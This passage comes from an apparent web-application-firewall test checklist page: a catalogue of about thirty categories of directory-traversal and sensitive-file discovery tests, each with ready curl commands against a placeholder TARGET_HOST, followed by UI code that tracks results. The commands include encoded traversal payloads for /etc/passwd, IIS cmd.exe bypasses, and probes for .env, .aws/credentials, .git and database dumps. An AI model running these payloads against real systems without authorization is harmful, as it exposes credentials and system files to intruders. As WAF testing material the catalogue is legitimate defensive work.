                            name: 'Mixed Encoding',
                            description: 'Mixed encoding techniques',
                            curl: 'curl "http://TARGET_HOST/..%252f..%252f..%252fetc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-003',
                    name: 'Directory Brute Force',
                    severity: 'high',
                    description: 'Brute force common directories',
                    scenarios: [
                        {
                            id: 'DIR-003-A',
                            name: 'Admin Directories',
                            description: 'Common admin paths',
                            curl: 'curl "http://TARGET_HOST/admin/" -v && curl "http://TARGET_HOST/administrator/" -v && curl "http://TARGET_HOST/admin_area/" -v'
                        },
                        {
                            id: 'DIR-003-B',
                            name: 'Config Directories',
                            description: 'Configuration directories',
                            curl: 'curl "http://TARGET_HOST/config/" -v && curl "http://TARGET_HOST/configuration/" -v && curl "http://TARGET_HOST/settings/" -v'
                        },
                        {
                            id: 'DIR-003-C',
                            name: 'Backup Directories',
                            description: 'Backup and temp directories',
                            curl: 'curl "http://TARGET_HOST/backup/" -v && curl "http://TARGET_HOST/backups/" -v && curl "http://TARGET_HOST/temp/" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-004',
                    name: 'File Discovery',
                    severity: 'high',
                    description: 'Discover common files',
                    scenarios: [
                        {
                            id: 'DIR-004-A',
                            name: 'Backup Files',
                            description: 'Common backup extensions',
                            curl: 'curl "http://TARGET_HOST/index.php.bak" -v && curl "http://TARGET_HOST/index.php.backup" -v && curl "http://TARGET_HOST/index.php~" -v'
                        },
                        {
                            id: 'DIR-004-B',
                            name: 'Config Files',
                            description: 'Configuration files',
                            curl: 'curl "http://TARGET_HOST/.env" -v && curl "http://TARGET_HOST/web.config" -v && curl "http://TARGET_HOST/.htaccess" -v'
                        },
                        {
                            id: 'DIR-004-C',
                            name: 'Info Files',
                            description: 'Information disclosure files',
                            curl: 'curl "http://TARGET_HOST/phpinfo.php" -v && curl "http://TARGET_HOST/readme.txt" -v && curl "http://TARGET_HOST/robots.txt" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-005',
                    name: 'Advanced Path Manipulation',
                    severity: 'critical',
                    description: 'Advanced path manipulation techniques',
                    scenarios: [
                        {
                            id: 'DIR-005-A',
                            name: 'Null Byte Bypass',
                            description: 'Null byte injection',
                            curl: 'curl "http://TARGET_HOST/../../etc/passwd%00.jpg" -v'
                        },
                        {
                            id: 'DIR-005-B',
                            name: 'Path Normalization',
                            description: 'Path normalization bypass',
                            curl: 'curl "http://TARGET_HOST/./././../././../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-005-C',
                            name: 'Windows Path',
                            description: 'Windows path traversal',
                            curl: 'curl "http://TARGET_HOST/..\\..\\..\\windows\\win.ini" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-006',
                    name: 'Case Sensitivity Bypass',
                    severity: 'medium',
                    description: 'Case variation for bypass',
                    scenarios: [
                        {
                            id: 'DIR-006-A',
                            name: 'Upper Case',
                            description: 'Upper case directory names',
                            curl: 'curl "http://TARGET_HOST/ADMIN/" -v && curl "http://TARGET_HOST/Admin/" -v && curl "http://TARGET_HOST/aDmIn/" -v'
                        },
                        {
                            id: 'DIR-006-B',
                            name: 'Mixed Case Files',
                            description: 'Mixed case file extensions',
                            curl: 'curl "http://TARGET_HOST/index.PhP" -v && curl "http://TARGET_HOST/index.pHp" -v && curl "http://TARGET_HOST/index.PHP" -v'
                        },
                        {
                            id: 'DIR-006-C',
                            name: 'Case in Path',
                            description: 'Case variations in path',
                            curl: 'curl "http://TARGET_HOST/Admin/Config/Settings" -v && curl "http://TARGET_HOST/admin/config/settings" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-007',
                    name: 'IIS Specific Tests',
                    severity: 'high',
                    description: 'IIS-specific directory tests',
                    scenarios: [
                        {
                            id: 'DIR-007-A',
                            name: 'IIS Short Names',
                            description: '8.3 short name scanning',
                            curl: 'curl "http://TARGET_HOST/a*~1*/" -v && curl "http://TARGET_HOST/b*~1*/" -v && curl "http://TARGET_HOST/c*~1*/" -v'
                        },
                        {
                            id: 'DIR-007-B',
                            name: 'IIS Unicode',
                            description: 'IIS Unicode bypass',
                            curl: 'curl "http://TARGET_HOST/scripts/..%c0%af../winnt/system32/cmd.exe" -v'
                        },
                        {
                            id: 'DIR-007-C',
                            name: 'IIS Double Decode',
                            description: 'IIS double decode bug',
                            curl: 'curl "http://TARGET_HOST/scripts/..%255c../winnt/system32/cmd.exe" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-008',
                    name: 'Apache Specific Tests',
                    severity: 'high',
                    description: 'Apache-specific directory tests',
                    scenarios: [
                        {
                            id: 'DIR-008-A',
                            name: 'Apache Status',
                            description: 'Apache status pages',
                            curl: 'curl "http://TARGET_HOST/server-status" -v && curl "http://TARGET_HOST/server-info" -v'
                        },
                        {
                            id: 'DIR-008-B',
                            name: 'Apache Config',
                            description: 'Apache configuration files',
                            curl: 'curl "http://TARGET_HOST/.htaccess" -v && curl "http://TARGET_HOST/.htpasswd" -v'
                        },
                        {
                            id: 'DIR-008-C',
                            name: 'Apache MultiViews',
                            description: 'MultiViews bypass',
                            curl: 'curl "http://TARGET_HOST/admin" -H "Accept: application/x-httpd-php" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-009',
                    name: 'Framework Detection',
                    severity: 'medium',
                    description: 'Detect web frameworks',
                    scenarios: [
                        {
                            id: 'DIR-009-A',
                            name: 'PHP Frameworks',
                            description: 'Common PHP framework paths',
                            curl: 'curl "http://TARGET_HOST/vendor/composer/" -v && curl "http://TARGET_HOST/app/config/" -v'
                        },
                        {
                            id: 'DIR-009-B',
                            name: 'Java Frameworks',
                            description: 'Common Java framework paths',
                            curl: 'curl "http://TARGET_HOST/WEB-INF/web.xml" -v && curl "http://TARGET_HOST/META-INF/MANIFEST.MF" -v'
                        },
                        {
                            id: 'DIR-009-C',
                            name: 'Python Frameworks',
                            description: 'Common Python framework paths',
                            curl: 'curl "http://TARGET_HOST/static/" -v && curl "http://TARGET_HOST/media/" -v && curl "http://TARGET_HOST/manage.py" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-010',
                    name: 'API Endpoint Discovery',
                    severity: 'high',
                    description: 'Discover API endpoints',
                    scenarios: [
                        {
                            id: 'DIR-010-A',
                            name: 'REST API Paths',
                            description: 'Common REST API paths',
                            curl: 'curl "http://TARGET_HOST/api/v1" -v && curl "http://TARGET_HOST/api/v2" -v && curl "http://TARGET_HOST/api/users" -v'
                        },
                        {
                            id: 'DIR-010-B',
                            name: 'API Documentation',
                            description: 'API documentation endpoints',
                            curl: 'curl "http://TARGET_HOST/swagger" -v && curl "http://TARGET_HOST/api-docs" -v && curl "http://TARGET_HOST/openapi.json" -v'
                        },
                        {
                            id: 'DIR-010-C',
                            name: 'GraphQL Endpoints',
                            description: 'GraphQL specific endpoints',
                            curl: 'curl "http://TARGET_HOST/graphql" -v && curl "http://TARGET_HOST/graphiql" -v && curl "http://TARGET_HOST/playground" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-011',
                    name: 'Version Control Discovery',
                    severity: 'critical',
                    description: 'Find exposed version control',
                    scenarios: [
                        {
                            id: 'DIR-011-A',
                            name: 'Git Repository',
                            description: 'Git repository files',
                            curl: 'curl "http://TARGET_HOST/.git/config" -v && curl "http://TARGET_HOST/.git/HEAD" -v && curl "http://TARGET_HOST/.gitignore" -v'
                        },
                        {
                            id: 'DIR-011-B',
                            name: 'SVN Repository',
                            description: 'SVN repository files',
                            curl: 'curl "http://TARGET_HOST/.svn/entries" -v && curl "http://TARGET_HOST/.svn/all-wcprops" -v'
                        },
                        {
                            id: 'DIR-011-C',
                            name: 'Other VCS',
                            description: 'Other version control systems',
                            curl: 'curl "http://TARGET_HOST/.hg/requires" -v && curl "http://TARGET_HOST/CVS/Root" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-012',
                    name: 'Cloud Storage Discovery',
                    severity: 'high',
                    description: 'Find cloud storage misconfigurations',
                    scenarios: [
                        {
                            id: 'DIR-012-A',
                            name: 'AWS Files',
                            description: 'AWS configuration files',
                            curl: 'curl "http://TARGET_HOST/.aws/credentials" -v && curl "http://TARGET_HOST/.aws/config" -v'
                        },
                        {
                            id: 'DIR-012-B',
                            name: 'Cloud Metadata',
                            description: 'Cloud metadata endpoints',
                            curl: 'curl "http://TARGET_HOST/.well-known/aws" -v && curl "http://TARGET_HOST/.well-known/gcp" -v'
                        },
                        {
                            id: 'DIR-012-C',
                            name: 'Container Files',
                            description: 'Container configuration',
                            curl: 'curl "http://TARGET_HOST/Dockerfile" -v && curl "http://TARGET_HOST/docker-compose.yml" -v && curl "http://TARGET_HOST/.dockerignore" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-013',
                    name: 'Nginx Specific Tests',
                    severity: 'high',
                    description: 'Nginx-specific directory tests',
                    scenarios: [
                        {
                            id: 'DIR-013-A',
                            name: 'Nginx Config',
                            description: 'Nginx configuration files',
                            curl: 'curl "http://TARGET_HOST/nginx.conf" -v && curl "http://TARGET_HOST/.nginx/nginx.conf" -v'
                        },
                        {
                            id: 'DIR-013-B',
                            name: 'Nginx Alias Traversal',
                            description: 'Nginx alias traversal vulnerability',
                            curl: 'curl "http://TARGET_HOST/static../../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-013-C',
                            name: 'Nginx Status',
                            description: 'Nginx status pages',
                            curl: 'curl "http://TARGET_HOST/nginx_status" -v && curl "http://TARGET_HOST/status" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-014',
                    name: 'Path Truncation',
                    severity: 'high',
                    description: 'Path truncation vulnerabilities',
                    scenarios: [
                        {
                            id: 'DIR-014-A',
                            name: 'Long Path',
                            description: 'Path truncation with long names',
                            curl: 'curl "http://TARGET_HOST/admin/index.php/../../../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-014-B',
                            name: 'Path Extension',
                            description: 'Adding fake extension to path',
                            curl: 'curl "http://TARGET_HOST/admin.php/../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-014-C',
                            name: 'Windows Path Truncation',
                            description: 'Windows path truncation behaviors',
                            curl: 'curl "http://TARGET_HOST/admin.php......." -v && curl "http://TARGET_HOST/admin.php::$DATA" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-015',
                    name: 'Log File Discovery',
                    severity: 'high',
                    description: 'Find exposed log files',
                    scenarios: [
                        {
                            id: 'DIR-015-A',
                            name: 'Web Server Logs',
                            description: 'Common web server log files',
                            curl: 'curl "http://TARGET_HOST/logs/access.log" -v && curl "http://TARGET_HOST/log/error.log" -v'
                        },
                        {
                            id: 'DIR-015-B',
                            name: 'Application Logs',
                            description: 'Application specific logs',
                            curl: 'curl "http://TARGET_HOST/app/logs/app.log" -v && curl "http://TARGET_HOST/var/log/app.log" -v'
                        },
                        {
                            id: 'DIR-015-C',
                            name: 'Debug Logs',
                            description: 'Debug and error logs',
                            curl: 'curl "http://TARGET_HOST/debug.log" -v && curl "http://TARGET_HOST/error_log" -v && curl "http://TARGET_HOST/errors.log" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-016',
                    name: 'Directory Listing',
                    severity: 'medium',
                    description: 'Test for directory listing',
                    scenarios: [
                        {
                            id: 'DIR-016-A',
                            name: 'Basic Directory Listing',
                            description: 'Standard directory listing check',
                            curl: 'curl "http://TARGET_HOST/includes/" -v && curl "http://TARGET_HOST/uploads/" -v'
                        },
                        {
                            id: 'DIR-016-B',
                            name: 'Forced Directory Listing',
                            description: 'Attempts to force directory listing',
                            curl: 'curl "http://TARGET_HOST/includes/?C=N;O=D" -v'
                        },
                        {
                            id: 'DIR-016-C',
                            name: 'Alternative Index',
                            description: 'Check for alternative index files',
                            curl: 'curl "http://TARGET_HOST/includes/index.json" -v && curl "http://TARGET_HOST/includes/index.xml" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-017',
                    name: 'Path Parameter Traversal',
                    severity: 'critical',
                    description: 'Directory traversal via path parameters',
                    scenarios: [
                        {
                            id: 'DIR-017-A',
                            name: 'Basic Path Parameter',
                            description: 'Traversal via path parameter',
                            curl: 'curl "http://TARGET_HOST/path;/../../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-017-B',
                            name: 'Encoded Path Parameter',
                            description: 'URL encoded path parameter',
                            curl: 'curl "http://TARGET_HOST/path;%2f..%2f..%2f..%2fetc%2fpasswd" -v'
                        },
                        {
                            id: 'DIR-017-C',
                            name: 'Multiple Path Parameters',
                            description: 'Multiple traversal parameters',
                            curl: 'curl "http://TARGET_HOST/path;name=../;value=../../etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-018',
                    name: 'JAR/WAR File Discovery',
                    severity: 'high',
                    description: 'Find exposed Java archives',
                    scenarios: [
                        {
                            id: 'DIR-018-A',
                            name: 'WAR Files',
                            description: 'Exposed WAR files',
                            curl: 'curl "http://TARGET_HOST/app.war" -v && curl "http://TARGET_HOST/ROOT.war" -v'
                        },
                        {
                            id: 'DIR-018-B',
                            name: 'JAR Files',
                            description: 'Exposed JAR files',
                            curl: 'curl "http://TARGET_HOST/WEB-INF/lib/" -v && curl "http://TARGET_HOST/lib/" -v'
                        },
                        {
                            id: 'DIR-018-C',
                            name: 'EAR Files',
                            description: 'Exposed EAR files',
                            curl: 'curl "http://TARGET_HOST/app.ear" -v && curl "http://TARGET_HOST/deploy/" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-019',
                    name: 'Backup Pattern Tests',
                    severity: 'high',
                    description: 'Find files using backup patterns',
                    scenarios: [
                        {
                            id: 'DIR-019-A',
                            name: 'Timestamp Patterns',
                            description: 'Files with timestamp backups',
                            curl: 'curl "http://TARGET_HOST/index.php.20220101" -v && curl "http://TARGET_HOST/config.20221231.bak" -v'
                        },
                        {
                            id: 'DIR-019-B',
                            name: 'Temp File Patterns',
                            description: 'Temporary file patterns',
                            curl: 'curl "http://TARGET_HOST/index.php.swp" -v && curl "http://TARGET_HOST/.index.php.swp" -v && curl "http://TARGET_HOST/index.php.tmp" -v'
                        },
                        {
                            id: 'DIR-019-C',
                            name: 'Editor Backup Patterns',
                            description: 'Editor-created backup files',
                            curl: 'curl "http://TARGET_HOST/index.php~" -v && curl "http://TARGET_HOST/#index.php#" -v && curl "http://TARGET_HOST/index.php.save" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-020',
                    name: 'Hidden Directory Detection',
                    severity: 'high',
                    description: 'Find hidden directories',
                    scenarios: [
                        {
                            id: 'DIR-020-A',
                            name: 'Dot Directories',
                            description: 'Directories starting with dot',
                            curl: 'curl "http://TARGET_HOST/.config/" -v && curl "http://TARGET_HOST/.cache/" -v && curl "http://TARGET_HOST/.ssh/" -v'
                        },
                        {
                            id: 'DIR-020-B',
                            name: 'Underscore Directories',
                            description: 'Directories starting with underscore',
                            curl: 'curl "http://TARGET_HOST/_admin/" -v && curl "http://TARGET_HOST/_private/" -v && curl "http://TARGET_HOST/_backup/" -v'
                        },
                        {
                            id: 'DIR-020-C',
                            name: 'Special Character Directories',
                            description: 'Directories with special names',
                            curl: 'curl "http://TARGET_HOST/:/" -v && curl "http://TARGET_HOST/$/" -v && curl "http://TARGET_HOST/~/" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-021',
                    name: 'CI/CD Configuration Discovery',
                    severity: 'critical',
                    description: 'Find CI/CD configurations',
                    scenarios: [
                        {
                            id: 'DIR-021-A',
                            name: 'Jenkins Files',
                            description: 'Jenkins configuration files',
                            curl: 'curl "http://TARGET_HOST/Jenkinsfile" -v && curl "http://TARGET_HOST/.jenkins/" -v'
                        },
                        {
                            id: 'DIR-021-B',
                            name: 'GitHub Actions',
                            description: 'GitHub Actions workflow files',
                            curl: 'curl "http://TARGET_HOST/.github/workflows/" -v && curl "http://TARGET_HOST/.github/actions/" -v'
                        },
                        {
                            id: 'DIR-021-C',
                            name: 'Other CI/CD Files',
                            description: 'Other CI/CD configuration files',
                            curl: 'curl "http://TARGET_HOST/.gitlab-ci.yml" -v && curl "http://TARGET_HOST/.circleci/config.yml" -v && curl "http://TARGET_HOST/azure-pipelines.yml" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-022',
                    name: 'Tomcat Specific Tests',
                    severity: 'high',
                    description: 'Tomcat-specific directory tests',
                    scenarios: [
                        {
                            id: 'DIR-022-A',
                            name: 'Tomcat Manager',
                            description: 'Tomcat manager interfaces',
                            curl: 'curl "http://TARGET_HOST/manager/html" -v && curl "http://TARGET_HOST/host-manager/html" -v'
                        },
                        {
                            id: 'DIR-022-B',
                            name: 'Tomcat Examples',
                            description: 'Tomcat example applications',
                            curl: 'curl "http://TARGET_HOST/examples/" -v && curl "http://TARGET_HOST/docs/" -v'
                        },
                        {
                            id: 'DIR-022-C',
                            name: 'Tomcat Configuration',
                            description: 'Tomcat configuration files',
                            curl: 'curl "http://TARGET_HOST/conf/server.xml" -v && curl "http://TARGET_HOST/conf/web.xml" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-023',
                    name: 'Authentication Bypass via Path',
                    severity: 'critical',
                    description: 'Authentication bypass through path manipulation',
                    scenarios: [
                        {
                            id: 'DIR-023-A',
                            name: 'Alternate Extensions',
                            description: 'Using alternate file extensions',
                            curl: 'curl "http://TARGET_HOST/admin.php/login.php" -v && curl "http://TARGET_HOST/admin/.php" -v'
                        },
                        {
                            id: 'DIR-023-B',
                            name: 'Path Suffix',
                            description: 'Adding path suffixes',
                            curl: 'curl "http://TARGET_HOST/admin/%20" -v && curl "http://TARGET_HOST/admin/%09" -v && curl "http://TARGET_HOST/admin/." -v'
                        },
                        {
                            id: 'DIR-023-C',
                            name: 'URL Normalization',
                            description: 'URL normalization confusion',
                            curl: 'curl "http://TARGET_HOST/admin/dashboard//%252e%252e/%252e%252e/" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-024',
                    name: 'Serverless Function Discovery',
                    severity: 'high',
                    description: 'Find serverless function endpoints',
                    scenarios: [
                        {
                            id: 'DIR-024-A',
                            name: 'AWS Lambda',
                            description: 'AWS Lambda function endpoints',
                            curl: 'curl "http://TARGET_HOST/api/lambda" -v && curl "http://TARGET_HOST/.lambda/functions" -v'
                        },
                        {
                            id: 'DIR-024-B',
                            name: 'Azure Functions',
                            description: 'Azure Functions endpoints',
                            curl: 'curl "http://TARGET_HOST/api/functions" -v && curl "http://TARGET_HOST/function/" -v'
                        },
                        {
                            id: 'DIR-024-C',
                            name: 'Serverless Config',
                            description: 'Serverless configuration files',
                            curl: 'curl "http://TARGET_HOST/serverless.yml" -v && curl "http://TARGET_HOST/.serverless/" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-025',
                    name: 'HTTP Method Override Traversal',
                    severity: 'critical',
                    description: 'Path traversal via HTTP method override',
                    scenarios: [
                        {
                            id: 'DIR-025-A',
                            name: 'X-HTTP-Method-Override',
                            description: 'Using X-HTTP-Method-Override header',
                            curl: 'curl "http://TARGET_HOST/api/resource" -X POST -H "X-HTTP-Method-Override: ../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-025-B',
                            name: 'Method Parameter',
                            description: '_method parameter in request',
                            curl: 'curl "http://TARGET_HOST/api/resource" -X POST -d "_method=../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-025-C',
                            name: 'Content-Type Override',
                            description: 'Override via content type',
                            curl: 'curl "http://TARGET_HOST/api/resource" -X POST -H "Content-Type: application/x-www-form-urlencoded; _method=../../etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-026',
                    name: 'JavaScript Frontend Files',
                    severity: 'medium',
                    description: 'Find exposed JavaScript files',
                    scenarios: [
                        {
                            id: 'DIR-026-A',
                            name: 'Build Files',
                            description: 'Build configuration files',
                            curl: 'curl "http://TARGET_HOST/package.json" -v && curl "http://TARGET_HOST/webpack.config.js" -v && curl "http://TARGET_HOST/tsconfig.json" -v'
                        },
                        {
                            id: 'DIR-026-B',
                            name: 'Source Maps',
                            description: 'JavaScript source maps',
                            curl: 'curl "http://TARGET_HOST/js/main.js.map" -v && curl "http://TARGET_HOST/static/js/bundle.js.map" -v'
                        },
                        {
                            id: 'DIR-026-C',
                            name: 'Frontend Config',
                            description: 'Frontend configuration files',
                            curl: 'curl "http://TARGET_HOST/.npmrc" -v && curl "http://TARGET_HOST/.yarnrc" -v && curl "http://TARGET_HOST/.babelrc" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-027',
                    name: 'Unicode Directory Normalization',
                    severity: 'high',
                    description: 'Unicode normalization in path traversal',
                    scenarios: [
                        {
                            id: 'DIR-027-A',
                            name: 'Unicode Dot',
                            description: 'Unicode variants of dot',
                            curl: 'curl "http://TARGET_HOST/%E2%80%AE/%E2%80%AE/etc/passwd" -v'
                        },
                        {
                            id: 'DIR-027-B',
                            name: 'Unicode Path Components',
                            description: 'Unicode in path components',
                            curl: 'curl "http://TARGET_HOST/%E2%96%BD%E2%96%BD/%E2%96%BD%E2%96%BD/etc/passwd" -v'
                        },
                        {
                            id: 'DIR-027-C',
                            name: 'Combining Characters',
                            description: 'Unicode combining characters',
                            curl: 'curl "http://TARGET_HOST/..%cc%80/../..%cc%80/../etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-028',
                    name: 'Database File Discovery',
                    severity: 'critical',
                    description: 'Find exposed database files',
                    scenarios: [
                        {
                            id: 'DIR-028-A',
                            name: 'SQLite Files',
                            description: 'Exposed SQLite database files',
                            curl: 'curl "http://TARGET_HOST/db/database.sqlite" -v && curl "http://TARGET_HOST/app.db" -v && curl "http://TARGET_HOST/data.sqlite3" -v'
                        },
                        {
                            id: 'DIR-028-B',
                            name: 'Backup Databases',
                            description: 'Database backup files',
                            curl: 'curl "http://TARGET_HOST/db.sql" -v && curl "http://TARGET_HOST/backup.sql" -v && curl "http://TARGET_HOST/dump.sql" -v'
                        },
                        {
                            id: 'DIR-028-C',
                            name: 'Connection Files',
                            description: 'Database connection files',
                            curl: 'curl "http://TARGET_HOST/dbconnect.php" -v && curl "http://TARGET_HOST/db_config.php" -v && curl "http://TARGET_HOST/database.yml" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-029',
                    name: 'Content Management System Discovery',
                    severity: 'high',
                    description: 'Find CMS specific files',
                    scenarios: [
                        {
                            id: 'DIR-029-A',
                            name: 'WordPress Files',
                            description: 'WordPress specific files',
                            curl: 'curl "http://TARGET_HOST/wp-config.php" -v && curl "http://TARGET_HOST/wp-admin/" -v && curl "http://TARGET_HOST/wp-content/debug.log" -v'
                        },
                        {
                            id: 'DIR-029-B',
                            name: 'Drupal Files',
                            description: 'Drupal specific files',
                            curl: 'curl "http://TARGET_HOST/sites/default/settings.php" -v && curl "http://TARGET_HOST/core/CHANGELOG.txt" -v'
                        },
                        {
                            id: 'DIR-029-C',
                            name: 'Joomla Files',
                            description: 'Joomla specific files',
                            curl: 'curl "http://TARGET_HOST/configuration.php" -v && curl "http://TARGET_HOST/administrator/" -v && curl "http://TARGET_HOST/README.txt" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-030',
                    name: 'Multi-Context Directory Traversal',
                    severity: 'critical',
                    description: 'Directory traversal in multiple contexts',
                    scenarios: [
                        {
                            id: 'DIR-030-A',
                            name: 'File Upload Traversal',
                            description: 'Traversal in file upload',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@/dev/null;filename=../../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-030-B',
                            name: 'Cookie Traversal',
                            description: 'Traversal via cookie',
                            curl: 'curl "http://TARGET_HOST/view" -H "Cookie: theme=../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-030-C',
                            name: 'Referer Traversal',
                            description: 'Traversal via Referer header',
                            curl: 'curl "http://TARGET_HOST/resource" -H "Referer: http://evil.com/../../etc/passwd" -v'
                        }
                    ]
                }
            ]
        };

        // [Rest of the JavaScript code remains the same as in the previous version]
        // Global variables
        let testResults = JSON.parse(localStorage.getItem('wafTestResults')) || {};
        let currentFilter = 'all';
        let searchTerm = '';
        let settings = {
            targetHost: localStorage.getItem('targetHost') || 'TARGET_HOST'
        };

        // Initialize
        function init() {
            updateStats();
            renderTests();
            setupEventListeners();
        }

        // Setup event listeners
        function setupEventListeners() {
            document.getElementById('search').addEventListener('input', (e) => {
                searchTerm = e.target.value.toLowerCase();
                renderTests();
            });
        }

        // Update statistics
        function updateStats() {
            const allTests = Object.values(tests).flat();
            const allScenarios = allTests.reduce((acc, test) => acc + test.scenarios.length, 0);
            
            const stats = {
                total: allTests.length,
                scenarios: allScenarios,
                passed: 0,
                failed: 0,
                skipped: 0,
                pending: 0
            };

            // Count scenario results
            allTests.forEach(test => {
                const result = testResults[test.id];
                if (result && result.scenarios) {
                    test.scenarios.forEach(scenario => {
                        if (result.scenarios[scenario.id]) {
                            stats[result.scenarios[scenario.id]]++;
                        } else {
                            stats.pending++;
                        }
                    });
                } else {
                    stats.pending += test.scenarios.length;
                }
            });

            // Update displays
            document.getElementById('stat-total').textContent = stats.total;
            document.getElementById('stat-scenarios').textContent = stats.scenarios;
            document.getElementById('stat-passed').textContent = stats.passed;
            document.getElementById('stat-failed').textContent = stats.failed;
            document.getElementById('stat-skipped').textContent = stats.skipped;
            document.getElementById('stat-pending').textContent = stats.pending;

            // Update progress
            const completed = stats.passed + stats.failed + stats.skipped;
            const progress = Math.round((completed / stats.scenarios) * 100);
            
            document.getElementById('progress-percentage').textContent = progress + '%';
            
            // Update progress bar
            const progressFill = document.getElementById('progress-fill');
            progressFill.style.width = progress + '%';

            if (completed > 0) {
                document.getElementById('progress-passed').style.width = (stats.passed / completed) * 100 + '%';
                document.getElementById('progress-passed').textContent = stats.passed > 0 ? stats.passed : '';
                
                document.getElementById('progress-failed').style.width = (stats.failed / completed) * 100 + '%';
                document.getElementById('progress-failed').textContent = stats.failed > 0 ? stats.failed : '';
                
                document.getElementById('progress-skipped').style.width = (stats.skipped / completed) * 100 + '%';
                document.getElementById('progress-skipped').textContent = stats.skipped > 0 ? stats.skipped : '';
            }
        }

        // Render tests
        function renderTests() {
            const container = document.getElementById('test-container');
            container.innerHTML = '';

            Object.entries(tests).forEach(([category, categoryTests], categoryIndex) => {
                const visibleTests = categoryTests.filter(test => {
                    const matchesFilter = currentFilter === 'all' || test.severity === currentFilter;
                    const matchesSearch = searchTerm === '' || 
                        test.name.toLowerCase().includes(searchTerm) ||
                        test.id.toLowerCase().includes(searchTerm) ||
                        test.description.toLowerCase().includes(searchTerm) ||
                        category.toLowerCase().includes(searchTerm) ||
                        test.scenarios.some(s => 
                            s.name.toLowerCase().includes(searchTerm) ||
                            s.description.toLowerCase().includes(searchTerm)
                        );
                    return matchesFilter && matchesSearch;
                });

                if (visibleTests.length === 0) return;

                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'test-category';

                // Calculate category stats
                const categoryStats = {
                    total: 0,
                    passed: 0,
                    failed: 0,
                    skipped: 0
                };

                visibleTests.forEach(test => {
                    categoryStats.total += test.scenarios.length;
                    const result = testResults[test.id];
                    if (result && result.scenarios) {
                        test.scenarios.forEach(scenario => {
                            if (result.scenarios[scenario.id]) {
                                categoryStats[result.scenarios[scenario.id]]++;
                            }
                        });
                    }
                });

                categoryDiv.innerHTML = `
                    <div class="category-header" onclick="toggleCategory('category-${categoryIndex}')">
                        <div class="category-title">
                            <div class="category-icon"><i class="fas fa-folder"></i></div>
                            <span>${category}</span>
                        </div>
                        <div class="category-stats">
                            <div class="category-stat">
                                <div class="stat-icon"><i class="fas fa-check"></i></div>
                                <span>${categoryStats.passed}</span>
                            </div>
                            <div class="category-stat">
                                <div class="stat-icon"><i class="fas fa-times"></i></div>
                                <span>${categoryStats.failed}</span>
                            </div>
                            <div class="category-stat">
                                <div class="stat-icon"><i class="fas fa-forward"></i></div>
                                <span>${categoryStats.skipped}</span>
                            </div>
                            <div class="category-stat">
                                <div class="stat-icon"><i class="fas fa-chart-bar"></i></div>
                                <span>${categoryStats.total}</span>
                            </div>
                        </div>
                    </div>
                    <div class="category-content expanded" id="category-${categoryIndex}">
                        ${visibleTests.map(test => renderTestItem(test)).join('')}
                    </div>
                `;

                container.appendChild(categoryDiv);
            });
        }

        // Toggle category
        function toggleCategory(categoryId) {
            const content = document.getElementById(categoryId);
            content.classList.toggle('expanded');
        }

        // Render test item
        function renderTestItem(test) {
            const result = testResults[test.id] || {};
            const overallStatus = getTestOverallStatus(test, result);

            return `
                <div class="test-item ${overallStatus}" data-test-id="${test.id}">
                    <div class="test-header">
                        <div class="test-info">
                            <h3 class="test-name">${test.name}</h3>
                            <p class="test-description">${test.description}</p>
                            <div class="test-badges">
                                <span class="badge severity-${test.severity}">
                                    <i class="fas fa-exclamation-triangle"></i>
                                    ${test.severity.toUpperCase()}
                                </span>
                                <span class="badge test-id">
                                    <i class="fas fa-tag"></i>
                                    ${test.id}
                                </span>
                            </div>
                        </div>
                        <div class="test-actions">
                            <button class="test-action-btn pass-btn" onclick="updateAllScenarios('${test.id}', 'passed')">
                                <i class="fas fa-check"></i> All Pass
                            </button>
                            <button class="test-action-btn fail-btn" onclick="updateAllScenarios('${test.id}', 'failed')">
                                <i class="fas fa-times"></i> All Fail
                            </button>
                            <button class="test-action-btn skip-btn" onclick="updateAllScenarios('${test.id}', 'skipped')">
                                <i class="fas fa-forward"></i> All Skip
                            </button>
                            <button class="test-action-btn clear-btn" onclick="clearTest('${test.id}')">
                                <i class="fas fa-redo"></i> Clear
                            </button>
                        </div>
                    </div>
                    <div class="scenarios-section">
                        <div class="scenarios-header">
                            <div class="scenarios-label">
                                <i class="fas fa-vial"></i> Test Scenarios
                                <span class="scenario-count">${test.scenarios.length}</span>
                            </div>
                        </div>
                        <div class="scenarios-container">
                            ${test.scenarios.map(scenario => renderScenarioItem(test.id, scenario, result)).join('')}
                        </div>
                    </div>
                    <div class="notes-section">
                        <div class="notes-label">
